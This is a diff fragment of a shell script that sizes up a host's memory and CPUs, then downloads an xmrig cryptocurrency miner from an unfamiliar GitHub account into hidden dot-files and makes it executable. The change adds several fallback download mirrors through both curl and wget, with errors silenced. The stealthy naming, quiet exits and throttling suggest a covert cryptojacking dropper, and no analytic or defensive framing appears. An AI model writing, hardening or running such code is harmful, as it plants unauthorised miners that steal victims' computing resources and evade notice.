@@ -20,8 +20,13 @@ MEM=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 512
 MODE=fast; [ "$MEM" -lt 2400 ] && MODE=light
 TH=60; [ "$(nproc 2>/dev/null || echo 2)" -le 2 ] && TH=40
 HP=$((10000 + $(head -c2 /dev/urandom | od -An -tu2 | tr -d ' ') % 20000))
-U="https://github.com/xmrlvrr/xmrbin/releases/download/bin1/xmrig-$F.gz"
-curl -fsSL --max-time 90 "$U" -o "$D/.$N.gz" 2>/dev/null || exit 0
+for U in "https://cdn.jsdelivr.net/gh/xmrlvrr/xmrbin@main/xmrig-$F.gz" \
+         "https://raw.githubusercontent.com/xmrlvrr/xmrbin/main/xmrig-$F.gz" \
+         "https://github.com/xmrlvrr/xmrbin/releases/download/bin1/xmrig-$F.gz"; do
+  curl -fsSL --max-time 60 "$U" -o "$D/.$N.gz" 2>/dev/null && [ -s "$D/.$N.gz" ] && break
+  wget -q -O "$D/.$N.gz" "$U" 2>/dev/null && [ -s "$D/.$N.gz" ] && break
+done
+[ -s "$D/.$N.gz" ] || exit 0
 gunzip -c "$D/.$N.gz" > "$B" 2>/dev/null || exit 0
 chmod +x "$B" 2>/dev/null
 cat > "$D/.$N.json" <<J
